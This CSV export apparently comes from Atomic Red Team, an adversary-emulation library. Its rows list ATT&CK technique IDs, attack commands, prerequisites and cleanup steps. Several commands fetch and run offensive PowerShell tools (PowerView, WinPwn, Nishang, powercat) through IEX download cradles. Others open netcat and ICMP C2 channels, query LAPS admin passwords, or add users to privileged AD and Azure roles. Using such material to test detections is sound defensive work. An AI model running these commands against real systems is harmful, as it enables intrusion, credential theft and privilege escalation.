"TechniqueID","TestName","Command","PrereqCommand","CleanupCommand","SourceFile"
"T1087.002","Adfind - Enumerate Active Directory Exchange AD Objects","""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -sc exchaddresses #{optional_args}
","New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""
","","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml"
"T1087.002","Enumerate Default Domain Admin Details (Domain)","net user administrator /domain
","","","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml"
"T1087.002","Enumerate Active Directory for Unconstrained Delegation","Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=#{uac_prop})' -Server #{domain}
","if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
} else {
  Install-WindowsFeature RSAT-AD-PowerShell
}
","","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml"
"T1087.002","Get-DomainUser with PowerView","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose
","","","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml"
"T1087.002","Enumerate Active Directory Users with ADSISearcher","([adsisearcher]""objectcategory=user"").FindAll(); ([adsisearcher]""objectcategory=user"").FindOne()
","","","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml"
"T1087.002","Enumerate Linked Policies In ADSISearcher Discovery","(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]""$_"").gPlink){Write-Host ""[+] OU Path:""([ADSI]""$_"").Path;$a=((([ADSI]""$_"").gplink) -replace ""[[;]"" -split ""]"");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host ""Policy Path[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host ""Policy Name[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output ""`n"" }}
","","","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml"
"T1087.002","Enumerate Root Domain linked policies Discovery","(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]""$_"").gPlink){Write-Host ""[+] Domain Path:""([ADSI]""$_"").Path;$a=((([ADSI]""$_"").gplink) -replace ""[[;]"" -split ""]"");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host ""Policy Path[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host ""Policy Name[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output ""`n"" }}
","","","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml"
"T1087.002","WinPwn - generaldomaininfo","iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
generaldomaininfo -noninteractive -consoleoutput","","","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml"
"T1087.002","Kerbrute - userenum","cd ""PathToAtomicsFolder\..\ExternalPayloads""
.\kerbrute.exe userenum -d #{Domain} --dc #{DomainController} ""PathToAtomicsFolder\..\ExternalPayloads\username.txt""","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
invoke-webrequest ""https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe""

---
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
invoke-webrequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.002/src/username.txt?raw=true"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\username.txt""
","","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml"
"T1087.002","Wevtutil - Discover NTLM Users Remote","$target = $env:LOGONSERVER
$target = $target.Trim(""\\"")
$IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString
wmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\ntlmusers.evtx /q:\""Event[System[(EventID=4776)]]""'","","Remove-Item -Path \\$IpAddress\c$\ntlmusers.evtx
","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml"
"T1087.002","Suspicious LAPS Attributes Query with Get-ADComputer all properties","Get-ADComputer #{hostname} -Properties *","","","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml"
"T1087.002","Suspicious LAPS Attributes Query with Get-ADComputer ms-Mcs-AdmPwd property","Get-ADComputer #{hostname} -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime","","","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml"
"T1087.002","Suspicious LAPS Attributes Query with Get-ADComputer all properties and SearchScope","Get-adcomputer -SearchScope subtree -filter ""name -like '*'"" -Properties *","","","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml"
"T1087.002","Suspicious LAPS Attributes Query with adfind all properties","& ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" #{optional_args} -h #{domain} -s subtree -f ""objectclass=computer"" *
","","","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml"
"T1087.002","Suspicious LAPS Attributes Query with adfind ms-Mcs-AdmPwd","& ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" #{optional_args} -h #{domain} -s subtree -f ""objectclass=computer"" ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
","","","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml"
"T1087.002","Active Directory Domain Search","ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b ""CN=Users,DC=#{domain},DC=#{top_level_domain}"" -s sub -a always -z 1000 dn
","echo ldapsearch not found
","","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml"
"T1087.002","Account Enumeration with LDAPDomainDump","ldapdomaindump -u #{username} -p #{password} #{target_ip} -o /tmp/T1087","sudo apt-get -y install python3
---
wget -O /tmp/get-pip.py https://bootstrap.pypa.io/pip/3.6/get-pip.py
python3 /tmp/get-pip.py
---
pip install ldapdomaindump
---
pip install future","rm -rf /tmp/T1087/ 2>/dev/null 
","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml"
"T1090.001","Connection Proxy","export #{proxy_scheme}_proxy=#{proxy_server}:#{proxy_port}
curl #{test_url}
","[ ""#{run_squid}"" = ""true"" ] && ([ -x ""$(command -v squid --version)"" ] || sudo DEBIAN_FRONTEND=noninteractive apt-get -y install squid curl || sudo yum install -y squid curl || sudo dnf install -y squid curl || brew install curl squid) && (squid -N -d 1 &) && exit 0
echo ""Value #{run_squid} for variable ""run_squid"" is not valid"" && exit 1","unset #{proxy_scheme}_proxy
[ ""#{run_squid}"" == ""true"" ] && (kill -9 $(ps aux | grep ""squid -N"" | grep -v ""grep"" | awk '{print $2}'))
","C:\AtomicRedTeam\atomics\T1090.001\T1090.001.yaml"
"T1090.001","Connection Proxy for macOS UI","networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port}
networksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port}
","","networksetup -setwebproxystate #{interface} off
networksetup -setsecurewebproxystate #{interface} off
","C:\AtomicRedTeam\atomics\T1090.001\T1090.001.yaml"
"T1090.001","portproxy reg key","netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=#{connectaddress}","","netsh interface portproxy delete v4tov4 listenport=#{listenport} -ErrorAction Ignore | Out-Null","C:\AtomicRedTeam\atomics\T1090.001\T1090.001.yaml"
"T1090.003","Psiphon","& ""PathToAtomicsFolder\T1090.003\src\Psiphon.bat""
","if(-not (test-path $env:Temp\proxy-backup.txt)){
$Proxy = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' -Name ""ProxyServer"" -ErrorAction Ignore).ProxyServer
Set-Content $env:Temp\proxy-backup.txt $Proxy}

---
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
Invoke-WebRequest ""https://s3.amazonaws.com/0ubz-2q11-gi9y/psiphon3.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\psiphon3.exe"" 

---
New-Item -Type Directory ""PathToAtomicsFolder\T1090.003\src\"" -ErrorAction ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1090.003/src/Psiphon.bat"" -OutFile ""PathToAtomicsFolder\T1090.003\src\Psiphon.bat""
","$Proxy = Get-Content $env:Temp\proxy-backup.txt -ErrorAction Ignore
if($null -ne $Proxy) 
{Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' -Name ""ProxyServer"" -Value $Proxy}
","C:\AtomicRedTeam\atomics\T1090.003\T1090.003.yaml"
"T1090.003","Tor Proxy Usage - Windows","invoke-expression 'cmd /c start powershell -Command {cmd /c ""#{TorExe}""}'
sleep -s 60
stop-process -name ""tor"" | out-null
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://archive.torproject.org/tor-package-archive/torbrowser/11.0.6/tor-win32-0.4.6.9.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\tor.zip""
expand-archive -LiteralPath ""PathToAtomicsFolder\..\ExternalPayloads\tor.zip"" -DestinationPath ""PathToAtomicsFolder\..\ExternalPayloads\tor""
","","C:\AtomicRedTeam\atomics\T1090.003\T1090.003.yaml"
"T1090.003","Tor Proxy Usage - Debian/Ubuntu/FreeBSD","[ ""$(uname)"" = 'FreeBSD' ] && sysrc tor_enable=""YES"" && service tor start || sudo systemctl start tor
","(which apt && sudo apt-get -y install tor) || (which pkg && pkg install -y tor)
","[ ""$(uname)"" = 'FreeBSD' ] && service tor stop && sysrc -x tor_enable || sudo systemctl stop tor
","C:\AtomicRedTeam\atomics\T1090.003\T1090.003.yaml"
"T1090.003","Tor Proxy Usage - MacOS","osascript -e 'tell application ""Terminal"" to do script ""tor""'
","if [ ! -x ""$(command -v brew --version)"" ]; then /bin/bash -c ""$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh keystroke return)""; fi
brew install tor
","killall tor > /dev/null 2>&1
","C:\AtomicRedTeam\atomics\T1090.003\T1090.003.yaml"
"T1091","USB Malware Spread Simulation","$RemovableDrives=@()
$RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter ""drivetype=2"" | select-object -expandproperty DeviceID
ForEach ($Drive in $RemovableDrives)
{
write-host ""Removable Drive Found:"" $Drive
New-Item -Path $Drive/T1091Test1.txt -ItemType ""file"" -Force -Value ""T1091 Test 1 has created this file to simulate malware spread to removable drives.""
}
","","$RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter ""drivetype=2"" | select-object -expandproperty DeviceID
ForEach ($Drive in $RemovableDrives)
{
Remove-Item -Path $Drive\T1091Test1.txt -Force -ErrorAction Ignore
}
","C:\AtomicRedTeam\atomics\T1091\T1091.yaml"
"T1095","ICMP C2","IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
Invoke-PowerShellIcmp -IPAddress #{server_ip}
","","","C:\AtomicRedTeam\atomics\T1095\T1095.yaml"
"T1095","Netcat C2","cmd /c ""#{ncat_exe}"" #{server_ip} #{server_port}
","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -ItemType Directory -Force -Path ""#{ncat_path}"" | Out-Null
$parentpath = Split-Path (Split-Path ""#{ncat_exe}""); $zippath = ""$parentpath\nmap.zip""
Invoke-WebRequest  ""https://nmap.org/dist/nmap-7.80-win32.zip"" -OutFile ""$zippath""
  Expand-Archive $zippath $parentpath -Force
  $unzipPath = Join-Path $parentPath ""nmap-7.80""
if( $null -eq (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | ?{$_.DisplayName -like ""Microsoft Visual C++*""}) ) {
  Start-Process (Join-Path $unzipPath ""vcredist_x86.exe"")
}
","","C:\AtomicRedTeam\atomics\T1095\T1095.yaml"
"T1095","Powercat C2","IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
powercat -c #{server_ip} -p #{server_port}
","","","C:\AtomicRedTeam\atomics\T1095\T1095.yaml"
"T1095","Linux ICMP Reverse Shell using icmp-cnc","","","","C:\AtomicRedTeam\atomics\T1095\T1095.yaml"
"T1098","Admin Account Manipulate","$x = Get-Random -Minimum 2 -Maximum 9999
$y = Get-Random -Minimum 2 -Maximum 9999
$z = Get-Random -Minimum 2 -Maximum 9999
$w = Get-Random -Minimum 2 -Maximum 9999
Write-Host HaHa_$x$y$z

$fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match ""User"" -and $_.PrincipalSource -match ""Local""} | Select Name

foreach($member in $fmm) {
    if($member -like ""*Administrator*"") {
        $account = $member.Name.Split(""\"")[-1] # strip computername\
        $originalDescription = (Get-LocalUser -Name $account).Description
        Set-LocalUser -Name $account -Description ""atr:$account;$originalDescription"".Substring(0,48) # Keep original name in description
        Rename-LocalUser -Name $account -NewName ""HaHa_$x$y$z"" # Required due to length limitation
        Write-Host ""Successfully Renamed $account Account on "" $Env:COMPUTERNAME
        }
    }
","","$list = Get-LocalUser |?{$_.Description -like ""atr:*""}
foreach($u in $list) {
  $u.Description -match ""atr:(?<Name>[^;]+);(?<Description>.*)""
  Set-LocalUser -Name $u.Name -Description $Matches.Description
  Rename-LocalUser -Name $u.Name -NewName $Matches.Name
  Write-Host ""Successfully Reverted Account $($u.Name) to $($Matches.Name) on "" $Env:COMPUTERNAME
}
","C:\AtomicRedTeam\atomics\T1098\T1098.yaml"
"T1098","Domain Account and Group Manipulate","$x = Get-Random -Minimum 2 -Maximum 99
$y = Get-Random -Minimum 2 -Maximum 99
$z = Get-Random -Minimum 2 -Maximum 99
$w = Get-Random -Minimum 2 -Maximum 99

Import-Module ActiveDirectory
$account = ""#{account_prefix}-$x$y$z""
New-ADUser -Name $account -GivenName ""Test"" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False #{create_args}
Add-ADGroupMember ""#{group}"" $account
","if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
} else {
  Install-WindowsFeature RSAT-AD-PowerShell
}
","Get-ADUser -LDAPFilter ""(&(samaccountname=#{account_prefix}-*)(givenName=Test))"" | Remove-ADUser -Confirm:$False
","C:\AtomicRedTeam\atomics\T1098\T1098.yaml"
"T1098","AWS - Create a group and add a user to that group","aws iam create-group --group-name #{username}
aws iam add-user-to-group --user-name #{username} --group-name #{username}
","echo Please run atomic test T1136.003, before running this atomic test
","aws iam remove-user-from-group --user-name #{username} --group-name #{username}
aws iam delete-group --group-name #{username}
","C:\AtomicRedTeam\atomics\T1098\T1098.yaml"
"T1098","Azure AD - adding user to Azure AD role","Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzureAD -Credential $Credential

$user = Get-AzureADUser -Filter ""DisplayName eq '#{user_principal_name}' or UserPrincipalName eq '#{user_principal_name}'""
if ($user -eq $null) { Write-Warning ""User not found""; exit }
$role = Get-AzureADDirectoryRole -Filter ""DisplayName eq '#{role_name}'""
if ($role -eq $null) { Write-Warning ""Role not found""; exit }
Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId
Write-Host ""User $($user.DisplayName) was added to $($role.DisplayName) role""
","Install-Module -Name AzureAD -Force
","Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzureAD -Credential $Credential -ErrorAction Ignore

$user = Get-AzureADUser -Filter ""DisplayName eq '#{user_principal_name}' or UserPrincipalName eq '#{user_principal_name}'""
if ($user -eq $null) { Write-Warning ""User not found""; exit }
$role = Get-AzureADDirectoryRole -Filter ""DisplayName eq '#{role_name}'""
if ($role -eq $null) { Write-Warning ""Role not found""; exit }

Remove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $user.ObjectId
Write-Host ""User $($user.DisplayName) was removed from $($role.DisplayName) role""
","C:\AtomicRedTeam\atomics\T1098\T1098.yaml"
"T1098","Azure AD - adding service principal to Azure AD role","Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzureAD -Credential $Credential

$sp = Get-AzureADServicePrincipal -Filter ""DisplayName eq '#{service_principal_name}'""
if ($sp -eq $null) { Write-Warning ""Service Principal not found""; exit }
$role = Get-AzureADDirectoryRole -Filter ""DisplayName eq '#{role_name}'""
if ($role -eq $null) { Write-Warning ""Role not found""; exit }
Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $sp.ObjectId
Write-Host ""Service Principal $($sp.DisplayName) was added to $($role.DisplayName)""
","Install-Module -Name AzureAD -Force
","Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzureAD -Credential $Credential -ErrorAction Ignore

$sp = Get-AzureADServicePrincipal -Filter ""DisplayName eq '#{service_principal_name}'""
if ($sp -eq $null) { Write-Warning ""Service Principal not found""; exit }
$role = Get-AzureADDirectoryRole -Filter ""DisplayName eq '#{role_name}'""
if ($role -eq $null) { Write-Warning ""Role not found""; exit }

Remove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $sp.ObjectId
Write-Host ""Service Principal $($sp.DisplayName) was removed from $($role.DisplayName) role""
","C:\AtomicRedTeam\atomics\T1098\T1098.yaml"
"T1098","Azure - adding user to Azure role in subscription","Import-Module -Name Az.Resources
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzAccount -Credential $Credential

$user = Get-AzADUser | where-object {$_.DisplayName -eq ""#{user_principal_name}"" -or $_.UserPrincipalName -eq ""#{user_principal_name}"" }
if ($user -eq $null) { Write-Warning ""User not found""; exit }
$subscription = Get-AzSubscription | where-object {$_.Name -eq ""#{subscription}""}
if ($subscription -eq $null) { Write-Warning ""Subscription not found""; exit }
$role = Get-AzRoleDefinition | where-object {$_.Name -eq ""#{role_name}""}
if ($role -eq $null) { Write-Warning ""Role not found""; exit }

New-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription
Write-Host ""User $($user.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)""
","Install-Module -Name Az.Resources -Force
","Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzAccount -Credential $Credential -ErrorAction Ignore

$user = Get-AzADUser | where-object {$_.DisplayName -eq ""#{user_principal_name}"" -or $_.UserPrincipalName -eq ""#{user_principal_name}"" }
if ($user -eq $null) { Write-Warning ""User not found""; exit }
$subscription = Get-AzSubscription | where-object {$_.Name -eq ""#{subscription}""}
if ($subscription -eq $null) { Write-Warning ""Subscription not found""; exit }
$role = Get-AzRoleDefinition | where-object {$_.Name -eq ""#{role_name}""}
if ($role -eq $null) { Write-Warning ""Role not found""; exit }

Remove-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription
Write-Host ""User Principal $($sp.DisplayName) was removed from $($role.Name) role in subscriptions $($subscriptions.Name)""
","C:\AtomicRedTeam\atomics\T1098\T1098.yaml"
